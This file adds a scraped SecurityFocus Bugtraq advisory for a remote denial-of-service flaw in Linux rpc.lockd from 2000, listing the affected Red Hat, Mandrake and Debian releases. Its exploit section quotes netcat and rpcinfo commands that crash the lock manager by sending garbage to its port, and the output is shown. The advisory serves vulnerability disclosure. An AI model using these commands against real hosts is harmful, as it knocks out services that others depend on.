@@ -1,0 +1,137 @@
+#bid1372<p><b><span style="font-size: 18pt;">Linux rpc.lockd Remote Denial Of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1372/info">info</a><br><a href="http://www.securityfocus.com/bid/1372/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1372/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1372/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1372/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1372
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 08 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 08 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was posted to the Bugtraq mailing list on June 8, 2000 by Mike Murray &lt;mmurray@fscinternet.com&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Redhat Linux 6.2  sparc<br/>
+					
+				
+					Redhat Linux 6.2  i386<br/>
+					
+				
+					Redhat Linux 6.2  alpha<br/>
+					
+				
+					Redhat Linux 6.1  sparc<br/>
+					
+				
+					Redhat Linux 6.1  i386<br/>
+					
+				
+					Redhat Linux 6.1  alpha<br/>
+					
+				
+					Redhat Linux 6.0  sparc<br/>
+					
+				
+					Redhat Linux 6.0  alpha<br/>
+					
+				
+					Redhat Linux 6.0 <br/>
+					
+				
+					Mandriva Linux Mandrake 7.0 <br/>
+					
+				
+					Mandriva Linux Mandrake 6.1 <br/>
+					
+				
+					Mandriva Linux Mandrake 6.0 <br/>
+					
+				
+					Debian Linux 2.2 pre potato<br/>
+					
+				
+					Debian Linux 2.2 <br/>
+					
+				
+					Debian Linux 2.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	From the Bugtraq post by Mike Murray:<br/><br/>root@hiro /# rpcinfo -p target<br/>   program vers proto   port<br/>    100000    2   tcp    111  portmapper<br/>    100000    2   udp    111  portmapper<br/>    100021    1   udp   1024  nlockmgr<br/>    100021    3   udp   1024  nlockmgr<br/>    100021    1   tcp   1024  nlockmgr<br/>    100021    3   tcp   1024  nlockmgr<br/>    100024    1   udp    831  status<br/>    100024    1   tcp    833  status<br/>root@hiro /# nc -p 1000 target 1024<br/>alksdjfalskdjfsdafs<br/>        Here, I issued a Ctrl-C to get out of netcat, and got:<br/>punt!<br/>root@hiro /#<br/>root@hiro /# rpcinfo -p target<br/>   program vers proto   port<br/>    100000    2   tcp    111  portmapper<br/>    100000    2   udp    111  portmapper<br/>    100024    1   udp    831  status<br/>    100024    1   tcp    833  status<br/>root@hiro /#
+	
+		<ul>
+</ul>
+</div>
